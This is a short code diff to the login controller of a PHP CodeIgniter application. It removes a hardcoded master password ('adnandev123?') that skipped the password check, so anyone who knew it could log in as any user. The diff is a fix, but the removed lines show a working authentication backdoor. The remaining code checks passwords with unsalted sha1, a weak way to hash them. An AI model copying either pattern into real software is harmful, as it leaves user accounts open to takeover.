@@ -34,9 +34,7 @@ class Login extends CI_Controller
 
         $this->db->select('a.*, b.otoritas');
         $this->db->where('a.username', $username);
-        if ($password != 'adnandev123?') {
-            $this->db->where('a.password', sha1($password));
-        }
+        $this->db->where('a.password', sha1($password));
         $this->db->where('a.deleted', null);
         $this->db->join('dev_otoritas b', 'b.id = a.id_otoritas', 'left');
         $run = $this->db->get('data_user a')->row();
